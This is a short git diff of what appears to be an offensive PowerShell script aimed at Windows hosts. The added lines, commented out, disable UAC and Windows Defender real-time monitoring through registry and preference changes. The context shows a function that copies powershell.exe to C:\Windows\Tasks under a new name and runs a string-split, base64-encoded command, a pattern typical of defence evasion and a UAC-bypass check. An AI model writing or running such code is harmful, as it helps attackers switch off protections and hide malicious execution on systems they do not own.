@@ -1,3 +1,8 @@
+#Set-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' -value 0
+#Get-MpComputerStatus
+#Set-MpPreference -DisableRealtimeMonitoring $true
+#New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+
 function b1946ac92492d2347c6235b4d2611184 {
     $cmd = "C:\Windows\Tasks\bruh.exe -enc" + " " + [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes("cm"+"d"+"."+"e"+"x"+"e"+" "+"/"+"c"+" "+"wh"+"oa"+"mi"+" "+"/"+"a"+"l"+"l"+" "+">"+" "+"C:"+"\u"+"a"+"c"+".t"+"xt"))
     copy C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Tasks\bruh.exe
